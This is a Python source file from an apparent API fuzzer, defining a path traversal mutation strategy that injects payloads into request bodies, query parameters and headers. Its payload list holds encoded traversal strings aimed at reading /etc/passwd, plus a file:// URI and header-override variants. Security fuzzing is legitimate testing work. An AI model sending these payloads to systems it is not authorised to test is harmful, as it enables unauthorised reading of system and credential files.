from __future__ import annotations

import copy
from typing import Any
from typing import Iterator

from rsfuzzer.mutations.strategies.base import _merge_body
from rsfuzzer.mutations.types import MutationTrace

_TRAVERSAL = (
    "../",
    "..\\",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "/var/www/../../etc/passwd",
    "file:///etc/passwd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
)


class PathTraversalStrategy:
    """Path traversal and file URI patterns in string fields (not URL path slot — use body/query)."""

    id = "path_traversal"
    category = "path_traversal"

    def __init__(self, *, light: bool = False) -> None:
        self._light = light

    def _payloads(self) -> Iterator[str]:
        for p in _TRAVERSAL[: (4 if self._light else len(_TRAVERSAL))]:
            yield p

    def mutate_body(
        self,
        body: dict[str, Any] | None,
    ) -> Iterator[tuple[dict[str, Any], MutationTrace]]:
        base = dict(body) if body else {}
        for p in self._payloads():
            merged = _merge_body(base, {"_path": p})
            yield merged, MutationTrace(self.id, self.category, {"inject_key": "_path", "payload": p[:48]})
        if body:
            for k, v in list(body.items())[: (2 if self._light else 5)]:
                if not isinstance(v, str) or not v:
                    continue
                for p in list(self._payloads())[:2]:
                    clone = copy.deepcopy(dict(body))
                    clone[k] = f"{v}/{p}secret.txt"
                    yield clone, MutationTrace(self.id, self.category, {"key": k, "suffix": p[:24]})

    def mutate_query(
        self,
        query: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        for p in self._payloads():
            q = dict(query)
            q["_path"] = p
            yield q, MutationTrace(self.id, self.category, {"param": "_path"})
        keys = list(query.keys())[: (1 if self._light else 3)]
        for k in keys or ["file"]:
            for p in list(self._payloads())[:2]:
                q = dict(query)
                q[k] = p
                yield q, MutationTrace(self.id, self.category, {"param": k})

    def mutate_headers(
        self,
        headers: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        for p in list(self._payloads())[: (2 if self._light else 4)]:
            h = dict(headers)
            h["X-Original-URL"] = f"/static/{p}"
            h["X-Forwarded-Prefix"] = p
            yield h, MutationTrace(self.id, self.category, {"header_injection": True})
